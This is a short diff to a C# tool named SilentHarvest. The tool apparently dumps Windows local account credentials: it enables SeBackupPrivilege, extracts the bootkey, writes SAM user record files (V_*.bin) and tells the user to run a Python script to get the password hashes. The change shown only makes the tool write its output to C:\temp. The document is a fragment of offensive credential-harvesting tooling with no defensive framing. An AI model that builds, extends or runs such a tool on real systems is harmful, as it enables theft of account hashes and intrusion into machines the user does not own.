@@ -341,6 +341,13 @@ class SilentHarvest
         
         Console.WriteLine("[+] SeBackupPrivilege enabled\n");
         
+        string outputDir = @"C:\temp";
+        if (!Directory.Exists(outputDir))
+        {
+            Directory.CreateDirectory(outputDir);
+        }
+        Environment.CurrentDirectory = outputDir;
+        
         // Extract bootkey
         Console.WriteLine("[*] Extracting bootkey...");
         byte[] bootKey = GetBootKey();
@@ -367,4 +374,5 @@ class SilentHarvest
         Console.WriteLine("    V_*.bin");
         Console.WriteLine("\n[*] Use Python decryption script to get hashes");
     }
+
 }
